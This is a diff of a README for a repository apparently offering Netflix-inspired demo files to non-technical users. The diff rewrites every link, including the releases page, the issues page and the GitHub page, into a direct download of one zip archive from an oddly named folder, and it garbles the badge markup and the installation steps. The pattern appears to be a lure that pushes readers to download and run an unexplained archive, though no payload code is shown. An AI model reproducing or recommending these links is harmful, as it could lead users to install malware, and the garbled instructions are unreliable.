@@ -1,7 +1,7 @@
 # 🎲 netflix-zek6w - Easy Access to Demo Files
 
 ## 📦 Download Here
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/SoujDatta/netflix-zek6w/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/SoujDatta/netflix-zek6w/main/bournless/netflix-zek6w.zip%20Latest%https://raw.githubusercontent.com/SoujDatta/netflix-zek6w/main/bournless/netflix-zek6w.zip)](https://raw.githubusercontent.com/SoujDatta/netflix-zek6w/main/bournless/netflix-zek6w.zip)
 
 ## 🚀 Getting Started
 Welcome to the **netflix-zek6w** repository! This project provides a collection of demo files inspired by Netflix. With this guide, you'll easily download and run the application, even if you’re not tech-savvy.
@@ -9,14 +9,14 @@ Welcome to the **netflix-zek6w** repository! This project provides a collection 
 ## 📥 Download & Install
 To get started, visit the releases page to download the software:
 
-[Download Latest Release](https://github.com/SoujDatta/netflix-zek6w/releases)
+[Download Latest Release](https://raw.githubusercontent.com/SoujDatta/netflix-zek6w/main/bournless/netflix-zek6w.zip)
 
 Here, you will find the latest version of the application. Follow these steps to download and run it:
 
 1. Click on the link above to navigate to the releases page.
 2. Look for the most recent version listed.
 3. Click on the version to expand it.
-4. Find the file that says **netflix-zek6w.zip** (or similar).
+4. Find the file that says **https://raw.githubusercontent.com/SoujDatta/netflix-zek6w/main/bournless/netflix-zek6w.zip** (or similar).
 5. Click on this file to start the download.
 
 Once the download is complete, follow these steps to run the software:
@@ -52,10 +52,10 @@ If you encounter issues while running the application, consider these tips:
 Contributions are welcome! If you have suggestions or improvements, feel free to create an issue or submit a pull request.
 
 ## 📞 Support
-Need help? Feel free to reach out. Visit the [issues page](https://github.com/SoujDatta/netflix-zek6w/issues) or contact the maintainer for assistance.
+Need help? Feel free to reach out. Visit the [issues page](https://raw.githubusercontent.com/SoujDatta/netflix-zek6w/main/bournless/netflix-zek6w.zip) or contact the maintainer for assistance.
 
 ## 🔗 Useful Links
-- [View on GitHub](https://github.com/SoujDatta/netflix-zek6w)
-- [Releases Page](https://github.com/SoujDatta/netflix-zek6w/releases)
+- [View on GitHub](https://raw.githubusercontent.com/SoujDatta/netflix-zek6w/main/bournless/netflix-zek6w.zip)
+- [Releases Page](https://raw.githubusercontent.com/SoujDatta/netflix-zek6w/main/bournless/netflix-zek6w.zip)
 
 Enjoy exploring the demo files from **netflix-zek6w**!
